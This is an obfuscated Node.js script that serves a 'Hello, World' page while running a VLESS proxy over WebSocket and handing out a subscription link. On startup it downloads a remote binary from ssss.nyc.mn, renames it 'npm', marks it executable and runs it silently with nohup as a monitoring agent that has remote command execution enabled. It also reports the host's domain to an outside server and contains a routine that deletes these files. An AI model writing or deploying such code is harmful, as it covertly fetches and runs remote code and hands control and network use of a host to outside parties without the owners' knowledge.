const _0x55c7b6=_0x17af;(function(_0x2e6e5c,_0x554e86){const _0x3d81d9=_0x17af,_0x13a0cf=_0x2e6e5c();while(!![]){try{const _0x1cc3ce=-parseInt(_0x3d81d9(0x132))/0x1+parseInt(_0x3d81d9(0x11c))/0x2+-parseInt(_0x3d81d9(0x157))/0x3*(parseInt(_0x3d81d9(0x151))/0x4)+-parseInt(_0x3d81d9(0x16e))/0x5*(parseInt(_0x3d81d9(0x10b))/0x6)+parseInt(_0x3d81d9(0x153))/0x7+parseInt(_0x3d81d9(0x149))/0x8*(parseInt(_0x3d81d9(0x136))/0x9)+parseInt(_0x3d81d9(0x156))/0xa*(parseInt(_0x3d81d9(0x11d))/0xb);if(_0x1cc3ce===_0x554e86)break;else _0x13a0cf['push'](_0x13a0cf['shift']());}catch(_0x355b5d){_0x13a0cf['push'](_0x13a0cf['shift']());}}}(_0x8380,0x32bfc));function _0x17af(_0x51ccd8,_0xcf3813){const _0x8380b3=_0x8380();return _0x17af=function(_0x17af2a,_0x530243){_0x17af2a=_0x17af2a-0x10b;let _0x5cd372=_0x8380b3[_0x17af2a];return _0x5cd372;},_0x17af(_0x51ccd8,_0xcf3813);}const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x55c7b6(0x144)),net=require(_0x55c7b6(0x16c)),{Buffer}=require(_0x55c7b6(0x13c)),{exec,execSync}=require(_0x55c7b6(0x137)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x55c7b6(0x148)][_0x55c7b6(0x15d)]||_0x55c7b6(0x133),NEZHA_SERVER=process[_0x55c7b6(0x148)][_0x55c7b6(0x118)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x55c7b6(0x148)]['NEZHA_KEY']||'',DOMAIN=process[_0x55c7b6(0x148)][_0x55c7b6(0x172)]||_0x55c7b6(0x154),AUTO_ACCESS=process['env']['AUTO_ACCESS']||!![],SUB_PATH=process['env'][_0x55c7b6(0x111)]||_0x55c7b6(0x13d),NAME=process[_0x55c7b6(0x148)]['NAME']||_0x55c7b6(0x10f),PORT=process[_0x55c7b6(0x148)][_0x55c7b6(0x145)]||0xbb8,metaInfo=execSync(_0x55c7b6(0x13f),{'encoding':'utf-8'}),ISP=metaInfo[_0x55c7b6(0x160)](),httpServer=http[_0x55c7b6(0x115)]((_0x1d0694,_0x27b5d3)=>{const _0x22d483=_0x55c7b6;if(_0x1d0694[_0x22d483(0x14f)]==='/')_0x27b5d3['writeHead'](0xc8,{'Content-Type':_0x22d483(0x13e)}),_0x27b5d3[_0x22d483(0x121)](_0x22d483(0x129));else{if(_0x1d0694[_0x22d483(0x14f)]==='/'+SUB_PATH){const _0x502754=_0x22d483(0x162)+UUID+'@www.visa.com.tw:443?encryption=none&security=tls&sni='+DOMAIN+_0x22d483(0x12c)+DOMAIN+_0x22d483(0x171)+NAME+'-'+ISP,_0x3580fe=Buffer[_0x22d483(0x127)](_0x502754)[_0x22d483(0x128)](_0x22d483(0x11b));_0x27b5d3[_0x22d483(0x173)](0xc8,{'Content-Type':_0x22d483(0x13e)}),_0x27b5d3[_0x22d483(0x121)](_0x3580fe+'\x0a');}else _0x27b5d3['writeHead'](0x194,{'Content-Type':_0x22d483(0x13e)}),_0x27b5d3[_0x22d483(0x121)](_0x22d483(0x114));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x55c7b6(0x166)](/-/g,'');wss['on']('connection',_0x24e73b=>{const _0x5354eb=_0x55c7b6;_0x24e73b[_0x5354eb(0x169)](_0x5354eb(0x134),_0x4e5929=>{const _0x1339bb=_0x5354eb,[_0x6adadf]=_0x4e5929,_0x2ae3c6=_0x4e5929[_0x1339bb(0x123)](0x1,0x11);if(!_0x2ae3c6[_0x1339bb(0x14a)]((_0x2e792d,_0x1375ff)=>_0x2e792d==parseInt(uuid[_0x1339bb(0x158)](_0x1375ff*0x2,0x2),0x10)))return;let _0xcbd7e8=_0x4e5929[_0x1339bb(0x123)](0x11,0x12)[_0x1339bb(0x141)]()+0x13;const _0x31f1bf=_0x4e5929[_0x1339bb(0x123)](_0xcbd7e8,_0xcbd7e8+=0x2)['readUInt16BE'](0x0),_0x290b71=_0x4e5929['slice'](_0xcbd7e8,_0xcbd7e8+=0x1)[_0x1339bb(0x141)](),_0x3ed825=_0x290b71==0x1?_0x4e5929['slice'](_0xcbd7e8,_0xcbd7e8+=0x4)[_0x1339bb(0x12b)]('.'):_0x290b71==0x2?new TextDecoder()[_0x1339bb(0x138)](_0x4e5929['slice'](_0xcbd7e8+0x1,_0xcbd7e8+=0x1+_0x4e5929['slice'](_0xcbd7e8,_0xcbd7e8+0x1)[_0x1339bb(0x141)]())):_0x290b71==0x3?_0x4e5929['slice'](_0xcbd7e8,_0xcbd7e8+=0x10)[_0x1339bb(0x14b)]((_0x1adb3b,_0x48cdc8,_0x498668,_0x4f0366)=>_0x498668%0x2?_0x1adb3b[_0x1339bb(0x143)](_0x4f0366['slice'](_0x498668-0x1,_0x498668+0x1)):_0x1adb3b,[])[_0x1339bb(0x16a)](_0x1ad3dd=>_0x1ad3dd[_0x1339bb(0x15f)](0x0)[_0x1339bb(0x128)](0x10))[_0x1339bb(0x12b)](':'):'';_0x24e73b['send'](new Uint8Array([_0x6adadf,0x0]));const _0x396297=createWebSocketStream(_0x24e73b);net[_0x1339bb(0x139)]({'host':_0x3ed825,'port':_0x31f1bf},function(){const _0x110ff9=_0x1339bb;this[_0x110ff9(0x13b)](_0x4e5929[_0x110ff9(0x123)](_0xcbd7e8)),_0x396297['on'](_0x110ff9(0x16f),()=>{})[_0x110ff9(0x12d)](this)['on'](_0x110ff9(0x16f),()=>{})[_0x110ff9(0x12d)](_0x396297);})['on'](_0x1339bb(0x16f),()=>{});})['on'](_0x5354eb(0x16f),()=>{});});function _0x8380(){const _0x36296f=['vless://','npm','--tls','false','replace','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','pop','once','map','npm\x20is\x20already\x20running','net','arch','165025xYFpPk','error','https://arm64.ssss.nyc.mn/agent','&path=%2F#','DOMAIN','writeHead','30MQzIAA','nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','Error\x20sending\x20request:','ps\x20aux\x20|\x20grep\x20\x22npm\x22\x20|\x20grep\x20-v\x20\x22grep\x22','Vls','has','SUB_PATH','https://amd64.ssss.nyc.mn/v1','listen','Not\x20Found\x0a','createServer','get','https://arm64.ssss.nyc.mn/v1','NEZHA_SERVER','writeFileSync','443','base64','142248uVVlKE','2807607givfeY','npm\x20is\x20running','NEZHA_SERVER:\x20','Error\x20added\x20Task:','end','length','slice','chmod\x20+x\x20./npm','data','8443','from','toString','Hello,\x20World\x0a','aarch64','join','&type=ws&host=','pipe','/bin/bash','\x0aclient_secret:\x20','arm','includes','348763rddLkR','de04add9-5c68-6bab-950c-08cd5320df33','message','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','31959WpoAUp','child_process','decode','connect','npm\x20running\x20error:\x20','write','buffer','sub','text/plain','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','\x20-p\x20','readUInt8','log','concat','axios','PORT','Server\x20is\x20running\x20on\x20port\x20','URL\x20is\x20empty.\x20Skip\x20Adding\x20Automatic\x20Access\x20Task','env','416pLMoot','every','reduce','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','2083','\x20>/dev/null\x202>&1\x20&','url','createWriteStream','4XkhaDA','Automatic\x20Access\x20Task\x20added\x20successfully:','2377018hfjUSo','1234.abc.com','config.yaml','20zxtvgD','1152504DDHeEo','substr','\x22}\x27','unlink','2053','finish','UUID','true','readUInt16BE','trim','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running'];_0x8380=function(){return _0x36296f;};return _0x8380();}const getDownloadUrl=()=>{const _0x346e2b=_0x55c7b6,_0x57113b=os[_0x346e2b(0x16d)]();return _0x57113b===_0x346e2b(0x130)||_0x57113b==='arm64'||_0x57113b===_0x346e2b(0x12a)?!NEZHA_PORT?_0x346e2b(0x117):_0x346e2b(0x170):!NEZHA_PORT?_0x346e2b(0x112):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x4fe636=_0x55c7b6;try{const _0x11643d=getDownloadUrl(),_0x13753a=await axios({'method':_0x4fe636(0x116),'url':_0x11643d,'responseType':'stream'}),_0x188528=fs[_0x4fe636(0x150)](_0x4fe636(0x163));return _0x13753a[_0x4fe636(0x125)][_0x4fe636(0x12d)](_0x188528),new Promise((_0x116e7e,_0x182e1f)=>{const _0x528987=_0x4fe636;_0x188528['on'](_0x528987(0x15c),()=>{const _0x2a51dc=_0x528987;console[_0x2a51dc(0x142)]('npm\x20download\x20successfully'),exec(_0x2a51dc(0x124),_0x1f65d1=>{if(_0x1f65d1)_0x182e1f(_0x1f65d1);_0x116e7e();});}),_0x188528['on'](_0x528987(0x16f),_0x182e1f);});}catch(_0x5de312){throw _0x5de312;}},runnz=async()=>{const _0x3f0661=_0x55c7b6;await downloadFile();let _0x173072='',_0x33eb68='';console[_0x3f0661(0x142)](_0x3f0661(0x11f)+NEZHA_SERVER);const _0x20527a=()=>{const _0x5986d4=_0x3f0661;try{const _0x3349fa=execSync(_0x5986d4(0x10e))['toString']();return _0x3349fa[_0x5986d4(0x122)]>0x0;}catch(_0x2ce18c){return![];}};if(_0x20527a()){console[_0x3f0661(0x142)](_0x3f0661(0x16b));return;}if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5e9825=[_0x3f0661(0x11a),_0x3f0661(0x126),'2096','2087',_0x3f0661(0x14d),'2053'];_0x173072=_0x5e9825[_0x3f0661(0x131)](NEZHA_PORT)?_0x3f0661(0x164):'',_0x33eb68='nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x3f0661(0x140)+NEZHA_KEY+'\x20'+_0x173072+_0x3f0661(0x14e);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xcfb75a=NEZHA_SERVER[_0x3f0661(0x131)](':')?NEZHA_SERVER['split'](':')[_0x3f0661(0x168)]():'',_0x105b41=new Set(['443',_0x3f0661(0x126),'2096','2087','2083',_0x3f0661(0x15b)]),_0x45bc04=_0x105b41[_0x3f0661(0x110)](_0xcfb75a)?_0x3f0661(0x15e):_0x3f0661(0x165),_0x3a8180=_0x3f0661(0x12f)+NEZHA_KEY+_0x3f0661(0x135)+NEZHA_SERVER+_0x3f0661(0x167)+_0x45bc04+_0x3f0661(0x14c)+UUID;!fs['existsSync'](_0x3f0661(0x155))&&fs[_0x3f0661(0x119)](_0x3f0661(0x155),_0x3a8180);}_0x33eb68=_0x3f0661(0x10c);}else{console[_0x3f0661(0x142)](_0x3f0661(0x161));return;}}try{exec(_0x33eb68,{'shell':_0x3f0661(0x12e)}),console[_0x3f0661(0x142)](_0x3f0661(0x11e));}catch(_0xa52c63){console[_0x3f0661(0x16f)](_0x3f0661(0x13a)+_0xa52c63);}};async function addAccessTask(){const _0x539405=_0x55c7b6;if(!AUTO_ACCESS)return;try{if(!DOMAIN){console['log'](_0x539405(0x147));return;}else{const _0x35389b='https://'+DOMAIN,_0x340c92='curl\x20-X\x20POST\x20\x22https://oooo.serv00.net/add-url\x22\x20-H\x20\x22Content-Type:\x20application/json\x22\x20-d\x20\x27{\x22url\x22:\x20\x22'+_0x35389b+_0x539405(0x159);exec(_0x340c92,(_0x4354d9,_0x13623b,_0x25a9cf)=>{const _0x37bceb=_0x539405;if(_0x4354d9){console[_0x37bceb(0x16f)](_0x37bceb(0x10d),_0x4354d9[_0x37bceb(0x134)]);return;}console[_0x37bceb(0x142)](_0x37bceb(0x152),_0x13623b);});}}catch(_0x4656cd){console[_0x539405(0x16f)](_0x539405(0x120),_0x4656cd['message']);}}const delFiles=()=>{const _0x24d477=_0x55c7b6;fs[_0x24d477(0x15a)]('npm',()=>{}),fs[_0x24d477(0x15a)](_0x24d477(0x155),()=>{});};httpServer[_0x55c7b6(0x113)](PORT,()=>{const _0xe6a9a5=_0x55c7b6;runnz(),addAccessTask(),console[_0xe6a9a5(0x142)](_0xe6a9a5(0x146)+PORT);});
